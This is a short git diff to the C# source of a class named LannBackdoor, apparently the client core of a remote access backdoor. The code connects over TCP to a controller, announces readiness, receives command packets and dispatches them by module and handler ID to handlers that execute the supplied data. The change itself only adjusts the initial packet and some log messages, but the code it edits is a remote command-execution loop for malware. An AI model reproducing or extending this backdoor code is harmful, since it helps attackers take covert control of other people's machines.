@@ -1,4 +1,5 @@
 ﻿using System.Net.Sockets;
+using System.Reflection;
 using LannLogger;
 using ModulesApi;
 using Networking;
@@ -28,17 +29,12 @@ public static class LannBackdoor {
 
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
-            await _tcpClient.SendPacket(PacketType.System, new {
-                ProductName = "Elbow Grease",
-                Enabled = true,
-                StockCount = 9000
-            });
+            await _tcpClient.SendPacket(PacketType.Ready, new { });
         };
 
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
-            Logger.Debug("Packet received ({Format}): {Module}/{Handler}: {Data}",
-                packet.IsDataRaw ? "RAW" : "JSON",
+            Logger.Debug("Packet received: {Module}/{Handler}: {Data}",
                 packet.ModuleId,
                 packet.HandlerId,
                 packet.GetData<object>());
@@ -61,7 +57,10 @@ public static class LannBackdoor {
                 Type type = handler.GetDataType();
                 await handler.Execute(_tcpClient, packet.GetData<object>(type));
             } catch (Exception e) {
-                Logger.Error("Failed to invoke handler: {Error}", e.Message);
+                Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
+                    packet.ModuleId,
+                    packet.HandlerId,
+                    e.Message);
             }
         };
 
